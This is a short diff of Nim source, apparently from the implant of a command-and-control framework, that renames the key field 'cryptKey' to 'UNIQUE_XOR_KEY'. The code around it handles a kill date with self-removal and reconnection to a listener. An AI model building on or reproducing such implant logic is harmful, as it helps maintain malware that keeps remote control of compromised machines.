@@ -102,7 +102,7 @@ proc runNp() {.exportc, cdecl.} =
         # We add a day to make sure the specified date is still included
         if listener.killDate != "":
             if parse(listener.killDate, "yyyy-MM-dd") + initDuration(days = 1) < now():
-                if listener.cryptKey != "":
+                if listener.UNIQUE_XOR_KEY != "":
                     listener.killSelf()
                 
                 when defined verbose: 
@@ -114,7 +114,7 @@ proc runNp() {.exportc, cdecl.} =
         if not listener.registered:
             try:
                 # Try reconnection first (UNCOMMENT)
-                listener.reconnect() # reconnect will change listener.initialized to true if successful and set the new cryptKey and id to current process
+                listener.reconnect() # reconnect will change listener.initialized to true if successful and set the new UNIQUE_XOR_KEY and id to current process
                 
                 # If still not initialized after reconnection attempt
                 if not listener.initialized:
